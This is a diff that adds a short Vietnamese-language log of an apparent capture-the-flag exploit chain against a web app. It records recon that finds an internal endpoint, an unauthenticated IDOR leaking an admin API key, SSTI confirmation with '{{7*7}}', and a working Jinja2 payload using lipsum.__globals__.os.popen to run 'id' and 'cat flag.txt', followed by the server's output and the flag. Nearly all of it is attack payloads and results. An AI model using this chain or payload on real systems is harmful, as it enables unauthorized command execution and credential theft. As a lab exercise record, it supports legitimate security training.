@@ -1,0 +1,19 @@
+[*] B0 recon: tai trang chu, tim file JS
+    thay script: /static/app.js
+    JS lo endpoint noi bo: /api/v2/users/<id>/keys
+
+[*] B1 IDOR: goi endpoint noi bo cho id=1 (admin), khong xac thuc
+    HTTP 200 -> {'admin_api_key': 'adm_k3y_31337_internal', 'id': 1, 'note': 'key dung cho cac endpoint /admin/*', 'role': 'admin', 'username': 'admin'}
+    [+] leak admin_api_key = adm_k3y_31337_internal
+
+[*] B2 SSTI: xac nhan template injection (7*7)
+    render '{{7*7}}' -> {'rendered': '49'}
+
+[*] B3 RCE: payload Jinja2 chay lenh he thong + doc flag.txt
+    payload = {{ lipsum.__globals__.os.popen('id; echo ---; cat flag.txt').read() }}
+    --- output lenh tren server ---
+    uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+    ---
+    FLAG{10.1_recon_idor_ssti_rce_chain}
+
+[+] Chuoi hoan tat. Flag: FLAG{10.1_recon_idor_ssti_rce_chain}
